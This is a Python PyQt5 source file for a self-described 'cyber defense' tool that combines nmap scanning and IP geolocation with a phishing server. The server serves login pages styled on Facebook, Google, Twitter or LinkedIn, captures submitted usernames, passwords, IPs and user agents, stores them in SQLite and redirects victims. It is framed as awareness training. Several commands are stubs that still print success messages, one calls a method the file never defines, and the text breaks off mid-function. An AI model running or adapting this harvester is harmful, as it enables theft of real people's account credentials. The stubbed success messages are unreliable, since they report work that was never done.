import os
import sys
import socket
import threading
import time
import requests
import json
import subprocess
import platform
import psutil
import ipaddress
import re
import shutil
import logging
import sqlite3
import random
import string
import webbrowser
import io
import base64
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Set, Tuple, Optional, Any

# GUI imports
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QTextEdit, QPushButton, QTabWidget,
                             QComboBox, QCheckBox, QGroupBox, QSpinBox, QFileDialog,
                             QMessageBox, QPlainTextEdit, QSplitter, QTableWidget,
                             QTableWidgetItem, QHeaderView, QMenuBar, QMenu, QAction,
                             QStatusBar, QToolBar, QSystemTrayIcon, QDialog,
                             QDialogButtonBox, QFormLayout, QProgressBar, QListWidget,
                             QListWidgetItem, QTreeWidget, QTreeWidgetItem, QFrame,
                             QStackedWidget, QTextBrowser, QInputDialog)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSettings, QSize, QProcess
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QTextCursor
from PyQt5.QtWebEngineWidgets import QWebEngineView

# Security tools imports
try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    import qrcode
    from PIL import Image
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# Configuration
CONFIG_FILE = "cyber_security_config.json"
DATABASE_FILE = "network_data.db"
REPORT_DIR = "reports"

class DatabaseManager:
    """Manage SQLite database for storing network data and threats"""
    
    def __init__(self):
        self.db_file = DATABASE_FILE
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # IP monitoring table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS monitored_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                threat_level INTEGER DEFAULT 0,
                last_scan TIMESTAMP
            )
        ''')
        
        # Threat detection table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threat_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL,
                threat_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                resolved BOOLEAN DEFAULT 0
            )
        ''')
        
        # Command history table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                success BOOLEAN DEFAULT 1
            )
        ''')
        
        # Network scan results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                services TEXT,
                os_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Phishing results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS phishing_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                page_name TEXT NOT NULL,
                credentials TEXT,
                visitor_ip TEXT,
                user_agent TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def log_command(self, command: str, source: str = 'local', success: bool = True):
        """Log command to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO command_history (command, source, success) VALUES (?, ?, ?)',
            (command, source, success)
        )
        conn.commit()
        conn.close()
    
    def log_threat(self, ip_address: str, threat_type: str, severity: str, description: str = ""):
        """Log threat detection to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO threat_logs (ip_address, threat_type, severity, description) VALUES (?, ?, ?, ?)',
            (ip_address, threat_type, severity, description)
        )
        conn.commit()
        conn.close()
    
    def get_recent_threats(self, limit: int = 20) -> List[Tuple]:
        """Get recent threats from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT ip_address, threat_type, severity, timestamp FROM threat_logs ORDER BY timestamp DESC LIMIT ?',
            (limit,)
        )
        results = cursor.fetchall()
        conn.close()
        return results
    
    def log_phishing_result(self, page_name: str, credentials: str, visitor_ip: str, user_agent: str):
        """Log phishing results to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO phishing_results (page_name, credentials, visitor_ip, user_agent) VALUES (?, ?, ?, ?)',
            (page_name, credentials, visitor_ip, user_agent)
        )
        conn.commit()
        conn.close()
    
    def get_phishing_results(self, limit: int = 50) -> List[Tuple]:
        """Get phishing results from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT page_name, credentials, visitor_ip, timestamp FROM phishing_results ORDER BY timestamp DESC LIMIT ?',
            (limit,)
        )
        results = cursor.fetchall()
        conn.close()
        return results

class NetworkScanner:
    """Network scanning capabilities"""
    
    def __init__(self):
        if NMAP_AVAILABLE:
            self.nm = nmap.PortScanner()
        else:
            self.nm = None
    
    def ping_ip(self, ip: str) -> str:
        """Simple ping that works reliably"""
        try:
            if os.name == 'nt':  # Windows
                cmd = ['ping', '-n', '4', ip]
            else:  # Linux/Mac
                cmd = ['ping', '-c', '4', ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.stdout
        except subprocess.TimeoutExpired:
            return f"Ping timeout for {ip}"
        except Exception as e:
            return f"Ping error: {str(e)}"
    
    def traceroute(self, target: str) -> str:
        """Perform traceroute"""
        try:
            if platform.system() == 'Windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('traceroute'):
                    cmd = ['traceroute', '-n', target]
                elif shutil.which('tracepath'):
                    cmd = ['tracepath', target]
                else:
                    cmd = ['ping', '-c', '4', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.stdout
        except Exception as e:
            return f"Traceroute error: {str(e)}"
    
    def port_scan(self, ip: str, ports: str = "1-1000") -> Dict[str, Any]:
        """Perform port scan"""
        if self.nm:
            try:
                self.nm.scan(ip, ports, arguments='-T4')
                open_ports = []
                
                if ip in self.nm.all_hosts():
                    for proto in self.nm[ip].all_protocols():
                        lport = self.nm[ip][proto].keys()
                        for port in lport:
                            if self.nm[ip][proto][port]['state'] == 'open':
                                open_ports.append({
                                    'port': port,
                                    'state': self.nm[ip][proto][port]['state'],
                                    'service': self.nm[ip][proto][port].get('name', 'unknown')
                                })
                
                return {
                    'success': True,
                    'target': ip,
                    'open_ports': open_ports,
                    'scan_time': datetime.now().isoformat()
                }
            except Exception as e:
                return {'success': False, 'error': str(e)}
        else:
            return {'success': False, 'error': 'Nmap not available'}
    
    def get_ip_location(self, ip: str) -> str:
        """Get IP location using ip-api.com"""
        try:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return json.dumps({
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'org': data.get('org', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A'),
                        'timezone': data.get('timezone', 'N/A')
                    }, indent=2)
                else:
                    return f"Location error: {data.get('message', 'Unknown error')}"
            else:
                return f"Location error: HTTP {response.status_code}"
        except Exception as e:
            return f"Location error: {str(e)}"

class PhishingServer(QThread):
    """Phishing server for awareness training"""
    
    new_credentials = pyqtSignal(str, dict)
    server_status = pyqtSignal(str)
    visitor_connected = pyqtSignal(str)

    def __init__(self, port, template, redirect_url, capture_all, page_id=None):
        super().__init__()
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.page_id = page_id
        self.running = False
        self.server = None

    def run(self):
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import urllib.parse
        
        class PhishingRequestHandler(BaseHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                self.template = kwargs.pop('template')
                self.redirect_url = kwargs.pop('redirect_url')
                self.capture_all = kwargs.pop('capture_all')
                self.callback = kwargs.pop('callback')
                self.visitor_callback = kwargs.pop('visitor_callback')
                super().__init__(*args)

            def log_message(self, format, *args):
                pass

            def do_GET(self):
                if self.path == '/':
                    client_info = f"Visitor from {self.client_address[0]} - {self.headers.get('User-Agent', 'Unknown')}"
                    self.visitor_callback(client_info)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(self.template.encode('utf-8'))
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                parsed_data = urllib.parse.parse_qs(post_data)
                cleaned_data = {k: v[0] for k, v in parsed_data.items()}
                
                if self.capture_all:
                    captured_data = cleaned_data
                else:
                    captured_data = {
                        'username': cleaned_data.get('username', ''),
                        'password': cleaned_data.get('password', '')
                    }
                
                captured_data['client_ip'] = self.client_address[0]
                captured_data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
                captured_data['timestamp'] = datetime.now().isoformat()
                
                self.callback(json.dumps(captured_data, indent=2))
                
                self.send_response(302)
                self.send_header('Location', self.redirect_url)
                self.end_headers()
        
        handler = lambda *args: PhishingRequestHandler(*args, 
                                                     template=self.template,
                                                     redirect_url=self.redirect_url,
                                                     capture_all=self.capture_all,
                                                     callback=self.handle_credentials,
                                                     visitor_callback=self.handle_visitor)
        
        class ThreadedHTTPServer(threading.Thread):
            def __init__(self, server):
                super().__init__()
                self.server = server
                self.daemon = True
            
            def run(self):
                self.server.serve_forever()
        
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), handler)
            self.server_thread = ThreadedHTTPServer(self.server)
            self.running = True
            self.server_status.emit(f"Server running on http://localhost:{self.port}")
            self.server_thread.start()
        except Exception as e:
            self.server_status.emit(f"Server error: {str(e)}")

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server_status.emit("Server stopped")
        self.running = False

    def handle_credentials(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            cred_data = json.loads(data)
            log_entry = f"[{timestamp}] Captured credentials:\n{json.dumps(cred_data, indent=2)}\n"
            self.new_credentials.emit(log_entry, cred_data)
        except json.JSONDecodeError:
            error_msg = f"[{timestamp}] Error parsing credentials: {data}\n"
            self.new_credentials.emit(error_msg, {})

    def handle_visitor(self, client_info):
        self.visitor_connected.emit(client_info)

class CommandLineInterface:
    """Command-line interface for the tool"""
    
    def __init__(self, main_app):
        self.main_app = main_app
        self.running = True
    
    def print_banner(self):
        """Print application banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║          🛡️ ACCURATE CYBER DEFENSE - MULTI-MODE TOOL 🛡️         ║
║                                                                  ║
║              Phishing Awareness + Network Security               ║
║                      GUI + Command Line Support                  ║
║                                                                  ║
║        Type 'help' for commands or 'gui' for graphical mode      ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def show_help(self):
        """Show help information"""
        help_text = """
🔧 COMMAND REFERENCE:

🌐 NETWORK SECURITY:
  scan [ip]              - Port scan IP address
  ping [ip]              - Ping IP address
  traceroute [ip]        - Traceroute to target
  location [ip]          - Get IP geolocation
  analyze [ip]           - Comprehensive IP analysis

📊 MONITORING:
  monitor [ip]           - Start monitoring IP
  unmonitor [ip]         - Stop monitoring IP
  list_monitored         - Show monitored IPs
  threats                - Show recent threats
  status                 - System status

🎯 PHISHING AWARENESS:
  phishing status        - Show phishing servers
  phishing start         - Start main phishing server
  phishing stop          - Stop phishing server
  phishing create        - Create phishing page
  phishing results       - Show captured credentials

💻 SYSTEM:
  system_info            - System information
  network_info           - Network information
  generate_report        - Generate security report
  history                - Command history

🔄 MODE:
  gui                    - Launch graphical interface
  exit                   - Exit application
  clear                  - Clear screen
        """
        print(help_text)
    
    def handle_command(self, command):
        """Handle command-line commands"""
        parts = command.split()
        if not parts:
            return
        
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        if cmd == 'help':
            self.show_help()
        
        elif cmd == 'exit':
            self.running = False
            print("👋 Exiting...")
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'gui':
            print("🚀 Launching graphical interface...")
            # This would need to be handled by the main application
            return 'gui'
        
        elif cmd == 'scan' and args:
            self.handle_scan(args[0])
        
        elif cmd == 'ping' and args:
            self.handle_ping(args[0])
        
        elif cmd == 'traceroute' and args:
            self.handle_traceroute(args[0])
        
        elif cmd == 'location' and args:
            self.handle_location(args[0])
        
        elif cmd == 'analyze' and args:
            self.handle_analyze(args[0])
        
        elif cmd == 'monitor' and args:
            self.handle_monitor(args[0])
        
        elif cmd == 'unmonitor' and args:
            self.handle_unmonitor(args[0])
        
        elif cmd == 'list_monitored':
            self.handle_list_monitored()
        
        elif cmd == 'threats':
            self.handle_threats()
        
        elif cmd == 'status':
            self.handle_status()
        
        elif cmd == 'system_info':
            self.handle_system_info()
        
        elif cmd == 'network_info':
            self.handle_network_info()
        
        elif cmd == 'generate_report':
            self.handle_generate_report()
        
        elif cmd == 'history':
            self.handle_history()
        
        elif cmd == 'phishing':
            self.handle_phishing_command(args)
        
        else:
            print(f"❌ Unknown command: {cmd}. Type 'help' for available commands.")
    
    def handle_scan(self, ip):
        """Handle scan command"""
        print(f"🔍 Scanning {ip}...")
        result = self.main_app.scanner.port_scan(ip)
        if result['success']:
            open_ports = result.get('open_ports', [])
            print(f"📊 Scan Results for {ip}:")
            print(f"Open Ports: {len(open_ports)}\n")
            for p in open_ports:
                print(f"  Port {p['port']}: {p['service']}")
        else:
            print(f"❌ Error: {result.get('error', 'Unknown')}")
    
    def handle_ping(self, ip):
        """Handle ping command"""
        print(f"🏓 Pinging {ip}...")
        result = self.main_app.scanner.ping_ip(ip)
        print(result)
    
    def handle_traceroute(self, target):
        """Handle traceroute command"""
        print(f"🛣️ Traceroute to {target}...")
        result = self.main_app.scanner.traceroute(target)
        print(result)
    
    def handle_location(self, ip):
        """Handle location command"""
        print(f"🌍 Getting location for {ip}...")
        result = self.main_app.scanner.get_ip_location(ip)
        print(result)
    
    def handle_analyze(self, ip):
        """Handle analyze command"""
        print(f"🔍 Analyzing {ip}...")
        # Implementation would go here
        print("✅ Analysis complete")
    
    def handle_monitor(self, ip):
        """Handle monitor command"""
        try:
            ipaddress.ip_address(ip)
            self.main_app.monitored_ips.add(ip)
            self.main_app.save_config()
            print(f"✅ Started monitoring {ip}")
        except ValueError:
            print(f"❌ Invalid IP: {ip}")
    
    def handle_unmonitor(self, ip):
        """Handle unmonitor command"""
        if ip in self.main_app.monitored_ips:
            self.main_app.monitored_ips.remove(ip)
            self.main_app.save_config()
            print(f"✅ Stopped monitoring {ip}")
        else:
            print(f"❌ IP not being monitored: {ip}")
    
    def handle_list_monitored(self):
        """Handle list_monitored command"""
        if self.main_app.monitored_ips:
            print("📋 Monitored IPs:")
            for ip in sorted(self.main_app.monitored_ips):
                print(f"  • {ip}")
        else:
            print("📋 No IPs are being monitored")
    
    def handle_threats(self):
        """Handle threats command"""
        threats = self.main_app.db_manager.get_recent_threats(10)
        if threats:
            print("🚨 Recent Threats:")
            for ip, ttype, severity, ts in threats:
                print(f"  • {ip} - {ttype} ({severity}) - {ts}")
        else:
            print("✅ No recent threats detected")
    
    def handle_status(self):
        """Handle status command"""
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        print("📊 System Status:")
        print(f"  CPU: {cpu}%")
        print(f"  Memory: {mem.percent}%")
        print(f"  Monitored IPs: {len(self.main_app.monitored_ips)}")
        print(f"  Phishing Servers: {len(self.main_app.phishing_servers)}")
    
    def handle_system_info(self):
        """Handle system_info command"""
        print("💻 System Information:")
        print(f"  OS: {platform.system()} {platform.release()}")
        print(f"  CPU Cores: {psutil.cpu_count()}")
        print(f"  CPU Usage: {psutil.cpu_percent()}%")
        print(f"  Memory: {psutil.virtual_memory().percent}%")
        print(f"  Disk: {psutil.disk_usage('/').percent}%")
    
    def handle_network_info(self):
        """Handle network_info command"""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print("🌐 Network Information:")
        print(f"  Hostname: {hostname}")
        print(f"  Local IP: {local_ip}")
        print(f"  Connections: {len(psutil.net_connections())}")
    
    def handle_generate_report(self):
        """Handle generate_report command"""
        print("📊 Generating security report...")
        # Implementation would generate a comprehensive report
        print("✅ Report generated successfully")
    
    def handle_history(self):
        """Handle history command"""
        history = self.main_app.db_manager.get_command_history(20)
        if history:
            print("📜 Command History:")
            for cmd, src, ts, success in history:
                status = "✅" if success else "❌"
                print(f"  {status} [{src}] {cmd} | {ts}")
        else:
            print("📜 No commands recorded")
    
    def handle_phishing_command(self, args):
        """Handle phishing subcommands"""
        if not args:
            print("❌ Phishing subcommand required. Use 'phishing help'")
            return
        
        subcmd = args[0].lower()
        
        if subcmd == 'status':
            if self.main_app.phishing_servers:
                print("🎯 Active Phishing Servers:")
                for port, server in self.main_app.phishing_servers.items():
                    status = "Running" if server.running else "Stopped"
                    print(f"  • Port {port}: {status}")
            else:
                print("🎯 No phishing servers running")
        
        elif subcmd == 'start':
            # Start default phishing server
            print("🚀 Starting phishing server...")
            # Implementation would start the server
        
        elif subcmd == 'stop':
            # Stop phishing servers
            print("🛑 Stopping phishing servers...")
            # Implementation would stop servers
        
        elif subcmd == 'create':
            print("📄 Creating phishing page...")
            # Implementation would create phishing page
        
        elif subcmd == 'results':
            results = self.main_app.db_manager.get_phishing_results(10)
            if results:
                print("📋 Recent Phishing Results:")
                for page, creds, ip, ts in results:
                    print(f"  • {page} - {ip} - {ts}")
            else:
                print("📋 No phishing results yet")
        
        elif subcmd == 'help':
            print("""
🎯 PHISHING COMMANDS:
  phishing status        - Show server status
  phishing start         - Start main server
  phishing stop          - Stop all servers
  phishing create        - Create new page
  phishing results       - Show captured data
            """)
        
        else:
            print(f"❌ Unknown phishing command: {subcmd}")

    def run(self):
        """Run the command-line interface"""
        self.print_banner()
        
        while self.running:
            try:
                command = input("\naccurateOS> ").strip()
                if command:
                    result = self.handle_command(command)
                    if result == 'gui':
                        return 'gui'
            except KeyboardInterrupt:
                print("\n👋 Exiting...")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

class AccurateCyberDefenseTool(QMainWindow):
    """Main application window - Integrated GUI for both tools"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Accurate Cyber Defense - Multi-Mode Security Tool")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize components
        self.db_manager = DatabaseManager()
        self.scanner = NetworkScanner()
        self.monitored_ips = set()
        self.phishing_servers = {}
        self.captured_credentials = []
        self.phishing_pages = {}
        self.settings = QSettings()
        
        # Statistics
        self.stats = {
            'pages_created': 0,
            'credentials_captured': 0,
            'network_scans': 0,
            'threats_detected': 0,
            'visitors': 0
        }
        
        # Set theme
        self.set_advanced_theme()
        
        # Initialize UI
        self.init_ui()
        
        # Load settings
        self.load_settings()
        
        # Load templates
        self.load_default_templates()
        
        # Start background monitoring
        self.start_background_monitoring()
    
    def set_advanced_theme(self):
        """Set professional dark theme"""
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e2d;
            }
            QTabWidget::pane {
                border: 2px solid #4B0082;
                background-color: #2d2d3c;
            }
            QTabBar::tab {
                background-color: #2d2d3c;
                color: #FFA500;
                padding: 8px 16px;
                border: 1px solid #4B0082;
                border-bottom: none;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
            }
            QTabBar::tab:selected {
                background-color: #4B0082;
                color: white;
            }
            QGroupBox {
                border: 2px solid #4B0082;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 15px;
                background-color: #2d2d3c;
                color: #FFA500;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px;
                background-color: #4B0082;
                color: white;
                border-radius: 4px;
            }
            QTextEdit, QPlainTextEdit, QLineEdit, QSpinBox, QComboBox {
                background-color: #3d3d4c;
                color: white;
                border: 1px solid #FF4500;
                border-radius: 4px;
                padding: 4px;
            }
            QPushButton {
                background-color: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #FF4500, stop: 1 #8B0000);
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #FF6347, stop: 1 #B22222);
            }
            QTableWidget {
                background-color: #2d2d3c;
                color: white;
                gridline-color: #4B0082;
                border: 1px solid #4B0082;
            }
            QHeaderView::section {
                background-color: #4B0082;
                color: white;
                padding: 6px;
                border: none;
            }
        """)
    
    def init_ui(self):
        """Initialize the user interface"""
        # Create menu bar
        self.create_menu_bar()
        
        # Create central widget with tabs
        central_widget = QTabWidget()
        self.setCentralWidget(central_widget)
        
        # Dashboard Tab
        dashboard_tab = self.create_dashboard_tab()
        central_widget.addTab(dashboard_tab, "📊 Dashboard")
        
        # Network Security Tab
        network_tab = self.create_network_tab()
        central_widget.addTab(network_tab, "🌐 Network Security")
        
        # Phishing Awareness Tab
        phishing_tab = self.create_phishing_tab()
        central_widget.addTab(phishing_tab, "🎯 Phishing Awareness")
        
        # Monitoring Tab
        monitoring_tab = self.create_monitoring_tab()
        central_widget.addTab(monitoring_tab, "👁️ Monitoring")
        
        # System Info Tab
        system_tab = self.create_system_tab()
        central_widget.addTab(system_tab, "💻 System Info")
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready - Educational Use Only")
    
    def create_dashboard_tab(self):
        """Create dashboard tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        
        # Statistics
        stats_group = QGroupBox("📈 Real-time Statistics")
        stats_layout = QHBoxLayout()
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        self.stats_labels = {}
        stats_data = [
            ("Phishing Pages", "pages_created", "0"),
            ("Credentials Captured", "credentials_captured", "0"),
            ("Network Scans", "network_scans", "0"),
            ("Threats Detected", "threats_detected", "0"),
            ("Visitors", "visitors", "0")
        ]
        
        for name, key, value in stats_data:
            stat_widget = QWidget()
            stat_layout = QVBoxLayout()
            stat_widget.setLayout(stat_layout)
            
            label = QLabel(value)
            label.setStyleSheet("font-size: 24px; font-weight: bold; color: #FFA500;")
            stat_layout.addWidget(label)
            
            title = QLabel(name)
            title.setStyleSheet("color: #CCCCCC;")
            stat_layout.addWidget(title)
            
            self.stats_labels[key] = label
            stats_layout.addWidget(stat_widget)
        
        # Quick Actions
        actions_group = QGroupBox("⚡ Quick Actions")
        actions_layout = QHBoxLayout()
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        quick_actions = [
            ("🌐 Scan Network", self.quick_scan),
            ("🎯 Start Phishing", self.quick_start_phishing),
            ("📊 Generate Report", self.quick_generate_report),
            ("🛡️ Check Threats", self.quick_check_threats)
        ]
        
        for text, slot in quick_actions:
            btn = QPushButton(text)
            btn.clicked.connect(slot)
            actions_layout.addWidget(btn)
        
        # Recent Activity
        activity_group = QGroupBox("📋 Recent Activity")
        activity_layout = QVBoxLayout()
        activity_group.setLayout(activity_layout)
        layout.addWidget(activity_group)
        
        self.activity_log = QPlainTextEdit()
        self.activity_log.setReadOnly(True)
        activity_layout.addWidget(self.activity_log)
        
        return widget
    
    def create_network_tab(self):
        """Create network security tab"""
        widget = QWidget()
        layout = QHBoxLayout()
        widget.setLayout(layout)
        
        # Left panel - Tools
        left_panel = QWidget()
        left_layout = QVBoxLayout()
        left_panel.setLayout(left_layout)
        layout.addWidget(left_panel)
        
        # Scan Tools
        scan_group = QGroupBox("🔍 Network Scanning")
        scan_layout = QFormLayout()
        scan_group.setLayout(scan_layout)
        left_layout.addWidget(scan_group)
        
        self.scan_ip = QLineEdit()
        self.scan_ip.setPlaceholderText("Enter IP address")
        scan_layout.addRow("Target IP:", self.scan_ip)
        
        self.scan_ports = QLineEdit("1-1000")
        scan_layout.addRow("Ports:", self.scan_ports)
        
        scan_btn = QPushButton("Start Port Scan")
        scan_btn.clicked.connect(self.start_port_scan)
        scan_layout.addRow(scan_btn)
        
        # Network Tools
        tools_group = QGroupBox("🛠️ Network Tools")
        tools_layout = QVBoxLayout()
        tools_group.setLayout(tools_layout)
        left_layout.addWidget(tools_group)
        
        tools = [
            ("Ping", self.start_ping),
            ("Traceroute", self.start_traceroute),
            ("Get Location", self.get_ip_location),
            ("WHOIS Lookup", self.start_whois),
            ("DNS Lookup", self.start_dns_lookup)
        ]
        
        for text, slot in tools:
            btn = QPushButton(text)
            btn.clicked.connect(slot)
            tools_layout.addWidget(btn)
        
        # Right panel - Results
        right_panel = QWidget()
        right_layout = QVBoxLayout()
        right_panel.setLayout(right_layout)
        layout.addWidget(right_panel)
        
        results_group = QGroupBox("📊 Scan Results")
        results_layout = QVBoxLayout()
        results_group.setLayout(results_layout)
        right_layout.addWidget(results_group)
        
        self.network_results = QPlainTextEdit()
        self.network_results.setReadOnly(True)
        results_layout.addWidget(self.network_results)
        
        return widget
    
    def create_phishing_tab(self):
        """Create phishing awareness tab"""
        widget = QWidget()
        layout = QHBoxLayout()
        widget.setLayout(layout)
        
        # Left panel - Configuration
        left_panel = QWidget()
        left_layout = QVBoxLayout()
        left_panel.setLayout(left_layout)
        layout.addWidget(left_panel)
        
        # Server Configuration
        server_group = QGroupBox("🚀 Server Configuration")
        server_layout = QFormLayout()
        server_group.setLayout(server_layout)
        left_layout.addWidget(server_group)
        
        self.phishing_port = QSpinBox()
        self.phishing_port.setRange(1024, 65535)
        self.phishing_port.setValue(8080)
        server_layout.addRow("Port:", self.phishing_port)
        
        self.redirect_url = QLineEdit("https://example.com")
        server_layout.addRow("Redirect URL:", self.redirect_url)
        
        server_controls = QHBoxLayout()
        self.start_phishing_btn = QPushButton("Start Server")
        self.start_phishing_btn.clicked.connect(self.start_phishing_server)
        server_controls.addWidget(self.start_phishing_btn)
        
        self.stop_phishing_btn = QPushButton("Stop Server")
        self.stop_phishing_btn.clicked.connect(self.stop_phishing_server)
        self.stop_phishing_btn.setEnabled(False)
        server_controls.addWidget(self.stop_phishing_btn)
        
        server_layout.addRow(server_controls)
        
        # Template Selection
        template_group = QGroupBox("📝 Phishing Templates")
        template_layout = QVBoxLayout()
        template_group.setLayout(template_layout)
        left_layout.addWidget(template_group)
        
        self.template_select = QComboBox()
        self.template_select.addItems(["Facebook", "Google", "Twitter", "LinkedIn", "Custom"])
        self.template_select.currentTextChanged.connect(self.change_template)
        template_layout.addWidget(self.template_select)
        
        self.template_editor = QTextEdit()
        template_layout.addWidget(self.template_editor)
        
        # Right panel - Results
        right_panel = QWidget()
        right_layout = QVBoxLayout()
        right_panel.setLayout(right_layout)
        layout.addWidget(right_panel)
        
        # Captured Credentials
        creds_group = QGroupBox("🔑 Captured Credentials")
        creds_layout = QVBoxLayout()
        creds_group.setLayout(creds_layout)
        right_layout.addWidget(creds_group)
        
        self.credentials_display = QPlainTextEdit()
        self.credentials_display.setReadOnly(True)
        creds_layout.addWidget(self.credentials_display)
        
        # Server Log
        log_group = QGroupBox("📋 Server Log")
        log_layout = QVBoxLayout()
        log_group.setLayout(log_layout)
        right_layout.addWidget(log_group)
        
        self.server_log = QPlainTextEdit()
        self.server_log.setReadOnly(True)
        log_layout.addWidget(self.server_log)
        
        return widget
    
    def create_monitoring_tab(self):
        """Create monitoring tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        
        # IP Monitoring
        ip_group = QGroupBox("👁️ IP Monitoring")
        ip_layout = QHBoxLayout()
        ip_group.setLayout(ip_layout)
        layout.addWidget(ip_group)
        
        self.monitor_ip = QLineEdit()
        self.monitor_ip.setPlaceholderText("Enter IP to monitor")
        ip_layout.addWidget(self.monitor_ip)
        
        add_btn = QPushButton("Add IP")
        add_btn.clicked.connect(self.add_monitored_ip)
        ip_layout.addWidget(add_btn)
        
        remove_btn = QPushButton("Remove IP")
        remove_btn.clicked.connect(self.remove_monitored_ip)
        ip_layout.addWidget(remove_btn)
        
        # Monitored IPs list
        self.monitored_list = QListWidget()
        layout.addWidget(self.monitored_list)
        
        # Threat Log
        threat_group = QGroupBox("🚨 Threat Detection")
        threat_layout = QVBoxLayout()
        threat_group.setLayout(threat_layout)
        layout.addWidget(threat_group)
        
        self.threat_log = QPlainTextEdit()
        self.threat_log.setReadOnly(True)
        threat_layout.addWidget(self.threat_log)
        
        return widget
    
    def create_system_tab(self):
        """Create system information tab"""
        widget = QWidget()
        layout = QVBoxLayout()
        widget.setLayout(layout)
        
        # System Information
        sys_group = QGroupBox("💻 System Information")
        sys_layout = QFormLayout()
        sys_group.setLayout(sys_layout)
        layout.addWidget(sys_group)
        
        self.system_info = QPlainTextEdit()
        self.system_info.setReadOnly(True)
        sys_layout.addRow(self.system_info)
        
        # Update system info
        self.update_system_info()
        
        # Network Information
        net_group = QGroupBox("🌐 Network Information")
        net_layout = QFormLayout()
        net_group.setLayout(net_layout)
        layout.addWidget(net_group)
        
